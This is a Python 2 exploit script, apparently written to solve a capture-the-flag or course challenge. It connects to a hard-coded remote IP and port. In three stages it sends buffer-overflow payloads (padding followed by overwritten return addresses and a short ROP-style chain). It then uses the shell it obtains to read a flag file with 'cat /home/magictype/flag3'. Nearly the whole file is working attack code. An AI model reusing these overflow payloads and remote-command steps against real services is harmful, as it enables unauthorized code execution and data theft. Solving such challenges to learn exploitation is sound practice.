if __name__=='__main__':
	import sys, socket, os
	HOST = '140.113.194.85'
	PORT = 49169
	""" stage 1: Congrats"""
	print "-----------Stage 1-----------" 
	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	sock.connect((HOST, PORT))
	#sock.send('2\n')
	#sock.send('\x2c\xb0\x04\x08\n')
	#sysaddr = sock.recv(2048)
        #print 'sys addr' + sysaddr
	
	print sock.recv(2048)
	sock.send('1\n')
	try : 
		while 1:
			print sock.recv(2048)
			#buffer overflow
			sock.send('aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xed\x88\x04\x08\n')
	except:
		sock.close()
		print "-----------The end of stage 1-----------"

	print "-----------Stage 2-----------" 
	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	sock.connect((HOST, PORT))
	print sock.recv(2048)
	sock.send('1\n')
	try:
		while 1:
			print sock.recv(2048)
			sock.send('aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xcd\x88\x04\x08\n')
		
	except:
		sock.close()
		print "-----------The end of stage 2-----------" 

	print "-----------Stage 3-----------" 
	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	sock.connect((HOST, PORT))
	print sock.recv(2048)
	sock.send('1\n')
	try:
		#while 1:
		print sock.recv(2048)
		sock.send('abcdedfghijkaaaabbbbccccddddsssswwwwxxxxyyyy\xf0\x86\x04\x08----\xa0\xb0\x04\x08\n')
		#while 1:
		print sock.recv(2048)
		sock.send('cat /home/magictype/flag3\n')
		#sock.send('cd /~ && ls\n')
		print sock.recv(2048)
		#print sock.recv(2048)
		#print sock.recv(2048)
		#sock.send('\xa0\xb0\x04\x08')
		#sock.send('\xf0\x86\x04\x08')
		#infoStr = sock.recv(2048)
		#print ":".join("{:02x}".format(ord(c)) for c in infoStr)
		#print infoStr
		sock.close()
	except:
		sock.close()
	print "-----------The end of stage 3-----------" 
